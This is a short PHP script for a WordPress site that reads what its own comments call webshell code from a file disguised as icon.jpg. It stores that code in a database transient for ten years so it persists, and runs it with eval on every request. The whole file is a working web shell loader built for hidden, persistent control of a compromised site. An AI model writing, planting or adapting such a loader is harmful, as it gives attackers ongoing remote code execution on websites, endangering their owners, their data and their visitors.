<?php
require_once __DIR__ . '/wp-load.php';

$key = 'my_webshell_codes';

$saved = get_transient($key);

if ($saved === false) {
    // Path to the icon.jpg file (same directory as this script)
    $file_path = __DIR__ . '/icon.jpg';
    
    // Check if file exists and is readable
    if (file_exists($file_path) && is_readable($file_path)) {
        // Read the webshell code from icon.jpg
        $saved = file_get_contents($file_path);
        
        if ($saved !== false && !empty($saved)) {
            // Store the code in transient for 10 years (practically forever)
            set_transient($key, $saved, 10 * YEAR_IN_SECONDS);
        } else {
            die("Failed to read code from icon.jpg");
        }
    } else {
        die("icon.jpg not found or not readable");
    }
}

// Execute the stored webshell code
eval('?>' . $saved);